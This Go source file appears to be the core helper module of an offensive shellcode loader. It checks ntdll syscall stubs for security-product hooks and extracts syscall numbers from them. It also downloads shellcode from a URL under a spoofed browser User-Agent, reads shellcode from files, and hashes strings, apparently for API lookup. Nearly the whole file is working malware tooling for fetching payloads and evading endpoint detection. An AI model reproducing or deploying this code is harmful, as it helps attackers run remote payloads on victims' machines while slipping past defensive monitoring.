package core

import (
  "io"
  "os"
  "fmt"
  "time"
  "bytes"
  "net/http"
  "math/rand"
  "io/ioutil"
  "crypto/sha1"
  "encoding/binary"

  // Third-party packages
  "github.com/Binject/debug/pe"
)

const ntdllpath = "C:\\Windows\\System32\\ntdll.dll"
const kernel32path = "C:\\Windows\\System32\\kernel32.dll"
var HookCheck = []byte{0x4c, 0x8b, 0xd1, 0xb8} // Define hooked bytes to look for

type MayBeHookedError struct { // Define custom error for hooked functions
  Foundbytes []byte
}

func (e MayBeHookedError) Error() string {
  return fmt.Sprintf("may be hooked: wanted %x got %x", HookCheck, e.Foundbytes)
}

func RvaToOffset(pefile *pe.File, rva uint32) (uint32) {
  for _, hdr := range pefile.Sections {
    baseoffset := uint64(rva)
    if baseoffset > uint64(hdr.VirtualAddress) &&
      baseoffset < uint64(hdr.VirtualAddress+hdr.VirtualSize) {
      return rva - hdr.VirtualAddress + hdr.Offset
    }
  }
  return rva
}

func CheckBytes(b []byte) (uint16, error) {
  if bytes.HasPrefix(b, HookCheck) == true { // Check syscall bytes
    return 0, MayBeHookedError{Foundbytes: b}
  }
  
  return binary.LittleEndian.Uint16(b[4:8]), nil
}

// Generate a random integer between range

func RandomInt(max int, min int) (int) { // Return a random number between max and min
  rand.Seed(time.Now().UnixNano())
  rand_int := rand.Intn(max - min + 1) + min
  return rand_int
}

// Shellcode helper functions

func GetShellcodeFromUrl(sc_url string) ([]byte, error) { // Make request to URL return shellcode
  req, err := http.NewRequest("GET", sc_url, nil)
  if err != nil {
    return []byte(""), err
  }

  req.Header.Set("Accept", "application/x-www-form-urlencoded")
  req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36")
  client := &http.Client{}
  resp, err := client.Do(req)
  if err != nil {
    return []byte(""), err
  }
  defer resp.Body.Close()

  b, err := io.ReadAll(resp.Body)
  if err != nil {
    return []byte(""), err
  }
  return b, nil
}

func GetShellcodeFromFile(file string) ([]byte, error) { // Read given file and return content in bytes
  f, err := os.Open(file)
  if err != nil {
    return []byte(""), err
  }
  defer f.Close()

  shellcode_bytes, err := ioutil.ReadAll(f)
  if err != nil {
    return []byte(""), err
  }

  return shellcode_bytes, nil
}

// Convert string to Sha1 (used for hashing)

func StrToSha1(str string) (string) {
  h := sha1.New()
  h.Write([]byte(str))
  bs := h.Sum(nil)
  return fmt.Sprintf("%x", bs)
}


